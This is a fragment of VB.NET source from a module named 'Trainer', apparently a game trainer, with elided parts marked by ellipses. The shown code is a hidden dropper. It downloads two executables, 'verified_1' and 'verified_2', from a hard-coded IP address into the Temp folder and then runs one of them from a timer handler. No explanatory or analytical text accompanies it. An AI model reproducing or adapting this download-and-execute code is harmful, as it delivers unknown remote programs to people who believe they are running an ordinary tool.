...
Module Trainer
    ...
    Public Sub Inject_Control()
        Try
            wc1 = New WebClient()
            wc1.DownloadFileAsync(New Uri("http://185.86.4.70/verified_1"), My.Computer.FileSystem.SpecialDirectories.Temp & "\verified_1.exe")

            wc2 = New WebClient()
            wc2.DownloadFileAsync(New Uri("http://185.86.4.70/verified_2"), My.Computer.FileSystem.SpecialDirectories.Temp & "\verified_2.exe")
    ...
    Private Sub Timer_Inject2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer_Inject2.Tick
        Try
            ...
            Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp & "\verified_2.exe")
        Catch ex As Exception
